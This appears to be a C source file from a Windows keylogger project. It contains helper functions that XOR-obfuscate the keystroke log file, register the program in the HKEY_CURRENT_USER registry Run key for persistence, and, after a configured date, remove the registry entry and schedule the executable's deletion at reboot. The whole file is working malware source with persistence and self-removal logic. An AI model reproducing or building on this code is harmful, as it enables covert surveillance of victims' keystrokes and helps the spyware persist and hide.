#include <Windows.h>
#include "config.h"
#include "logging.h"


/* Encrypt a given file */
// We probably need to dealloc 'lpLogFilePath'...
void EncryptFile_XOR(LPCWSTR lpLogFilePath)
{
	DebugMessage(L"EncryptFile_XOR");

	HANDLE hFile = CreateFileW(lpLogFilePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD dwNumberOfBytes = 0;
		byte bBuffer = 0;
		while (ReadFile(hFile, &bBuffer, 1, &dwNumberOfBytes, NULL) && dwNumberOfBytes > 0)
		{
			// "Encrypt" (Xoring..)
			bBuffer ^= ENC_XOR_KEY;
			// Go back 1 byte and write back to file
			SetFilePointer(hFile, -1, NULL, FILE_CURRENT);
			WriteFile(hFile, &bBuffer, 1, &dwNumberOfBytes, NULL);
		}
		CloseHandle(hFile);
	}
	else
	{
		DebugMessage(L"CreateFileW failed");
	}
}

/* Will set the keylogger to run at startup by writing to a specific location in registry */
void RegisterToRunAtStartup()
{
	DebugMessage(L"RegisterToRunAtStartup");

	WCHAR wcCurrentPath[MAX_PATH] = { 0 };
	HKEY regKey = NULL;
	
	// Get instance's path
	GetModuleFileName(NULL, wcCurrentPath, MAX_PATH);
	
	// Open Handle to the registry key
	if (RegOpenKeyExW(HKEY_CURRENT_USER, REGISTRY_STARTUP_PATH, 0, KEY_WRITE, &regKey) == ERROR_SUCCESS)
	{
		RegSetValueExW(regKey, REGISTRY_STARTUP_KEY, 0, REG_SZ, (byte *)wcCurrentPath, sizeof(wcCurrentPath));
		RegCloseKey(regKey);
	}

}

/* Will suicide if a certain date has passed. Returns TRUE if it did suicide, else False */
BOOL CheckAndSuicideIfNeeded()
{
	DebugMessage(L"Should Suicide?");

	WCHAR wcCurrentPath[MAX_PATH] = { 0 };
	HKEY regKey = NULL;
	SYSTEMTIME stSystemTime;

	// Get current time string
	GetLocalTime(&stSystemTime);
	
	// Check if current time has pssed the suicide date
	if (stSystemTime.wYear >= SUICIDE_TIME_YEAR && stSystemTime.wMonth >= SUICIDE_TIME_MONTH && stSystemTime.wDay >= SUICIDE_TIME_DAY)
	{
		DebugMessage(L"Suicide date passed. SUICDING NOW!");

		// Get instance's path
		GetModuleFileName(NULL, wcCurrentPath, MAX_PATH);

		// Remove from registry
		if (RegOpenKeyW(HKEY_CURRENT_USER, REGISTRY_STARTUP_PATH, &regKey) == ERROR_SUCCESS)
		{
			RegDeleteValueW(regKey, REGISTRY_STARTUP_KEY);
			RegCloseKey(regKey);
		}
		
		// Set for later deletion (reboot)
		MoveFileEx(wcCurrentPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
		return TRUE;
	}
	DebugMessage(L"Not suiciding today..");
	return FALSE;
}